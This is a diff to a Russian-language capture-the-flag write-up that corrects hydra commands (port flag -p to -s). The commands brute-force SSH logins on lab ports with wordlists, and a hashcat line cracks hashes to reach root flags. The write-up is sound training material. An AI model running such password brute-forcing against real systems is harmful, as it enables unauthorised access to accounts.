@@ -30,7 +30,7 @@ ssh root@<host> -p 2222
 Пароль мы не знаем, поэтому на помощь идет гидра и любезно оставленный организаторами файл с паролями:
 
 ```bash
-hydra -l root -P /path/to/wordlist.txt ssh://<host> -t 4 -V -p 2222
+hydra -l root -P /path/to/wordlist.txt ssh://<host> -t 4 -V -s 2222
 ```
 Получив пароль от рута коннектимся к машине и читаем флаг в корневой директории рута.
 
@@ -40,7 +40,7 @@ hydra -l root -P /path/to/wordlist.txt ssh://<host> -t 4 -V -p 2222
 #### Флаг в /root/flag.txt
 В задании сразу указан пользователь для подключения (mega_user) и 2223 порт, но не указан пароль, поэтому снова используем гидру:
 ```bash
-hydra -l root -P /path/to/wordlist.txt ssh://<host> -t 4 -V -p 2223
+hydra -l root -P /path/to/wordlist.txt ssh://<host> -t 4 -V -s 2223
 ```
 
 Получаем пароль от пользователя и заходим на машину.
@@ -154,7 +154,7 @@ hashcat -m 0 -a 0 /path/to/hashes /path/to/wordlist --show
 Получаем список паролей, который будем использовать для подключения, для перебора пользователей и паролей будем использовать гидру:
 
 ```bash
-hydra -L /path/to/workers -P /path/to/wordlist ssh://<host> -t 4 -V -p 2226
+hydra -L /path/to/workers -P /path/to/wordlist ssh://<host> -t 4 -V -s 2226
 ```
 
 После подбора кредов подключаемся под пользователем, который подобрался
